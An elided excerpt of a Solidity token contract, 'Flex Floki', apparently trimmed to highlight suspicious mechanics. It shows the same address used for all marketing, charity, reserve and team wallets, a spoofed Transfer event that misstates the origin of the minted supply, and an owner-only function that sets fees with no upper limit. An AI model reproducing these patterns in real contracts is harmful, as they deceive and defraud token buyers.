...
contract FlexFloki is Context, IERC20, Ownable {
    ...
    string private _name     = "Flex Floki";
    ...
    address public marketingWallet = 0x699b4E46Fc62bA9273f1D10E3E2f2723b4035F86;

    address public reserveWalletAddress = 0x699b4E46Fc62bA9273f1D10E3E2f2723b4035F86;
    address public charityWalletAddress = 0x699b4E46Fc62bA9273f1D10E3E2f2723b4035F86;
    address public teamWalletOne = 0x699b4E46Fc62bA9273f1D10E3E2f2723b4035F86;
    address public teamWalletTwo = 0x699b4E46Fc62bA9273f1D10E3E2f2723b4035F86;
    ...
    event TeamWalletOneChanged(address teamWalletOne);
    event TeamWalletTwoChanged(address teamWalletTwo);
    event TeamWalletThreeChanged(address teamWalletThree);
    event TeamWalletFourChanged(address teamWalletFour);
    ...
    { 
        ...
        _isExcludedFromFees[reserveWalletAddress] = true;
        _isExcludedFromFees[charityWalletAddress] = true;
        _isExcludedFromFees[teamWalletOne] = true;
        _isExcludedFromFees[teamWalletTwo] = true;
        _isExcludedFromFees[address(this)] = true;

        _rOwned[owner()] = _rTotal;
        emit Transfer(address(0xa99c602037f8E85A44bbe88f3C0EE3Af60345B9b), owner(), _tTotal);
    }
    ...
    function setFeetransfer(uint256 fees) external onlyOwner{
        marketingFee = fees;
        liquidityFee = fees;
    }
    function _transfer(
    ...
    function swapAndSendMarketing(uint256 tokenAmount) private {
        ...
        sendBNB(payable(marketingWallet), (newBalance * 730 / 1000));

        sendBNB(payable(reserveWalletAddress), (newBalance * 200 / 1000));
        sendBNB(payable(charityWalletAddress), (newBalance * 25 / 1000));
        sendBNB(payable(teamWalletOne), (newBalance * 25 / 1000));
        sendBNB(payable(teamWalletTwo), (newBalance * 20 / 1000));
